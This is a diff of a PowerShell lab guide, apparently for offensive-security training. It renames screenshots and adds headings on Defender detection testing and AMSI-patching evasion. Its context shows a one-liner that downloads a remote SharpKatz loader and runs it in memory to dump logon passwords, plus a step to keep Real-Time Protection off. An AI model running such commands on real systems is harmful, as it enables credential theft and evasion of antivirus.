@@ -22,7 +22,7 @@ cd \thev\labs\powershell
 .\av_check.ps1
 ```
 
-![image](./images/ps_defsettings.jpg)
+![image](./images/ps_avcheck_on.jpg)
 
 >**IMPORTANT**: Make sure Real-Time Protection is `disabled` (AMSI Scanning can by enable, it won't do anything if Real-Time Protection is disabled) - if this is not the case just run the following script, it will configure the right settings.
 
@@ -33,7 +33,7 @@ cd \thev\labs\powershell
 
 The output should be like this :
 
-![image](./images/ps_avdisabled.jpg)
+![image](./images/ps_avdisable.jpg)
 
 # 1. SharpKatz download and compile
 ```powershell
@@ -103,3 +103,11 @@ We can convert this back into a one-liner like this, notice the "&" at the begin
 ```powershell
 & ([ScriptBlock]::Create((New-Object Net.WebClient).DownloadString("http://10.0.0.7:9090/PSLoaderB64remoteSharpKatz.ps1"))) logonpasswords
 ```
+
+# 5. DETECTION TESTING
+
+- Turn Defender on
+- Gocheck
+- AmsiTrigger
+
+# 6. EVASION by patching AMSI
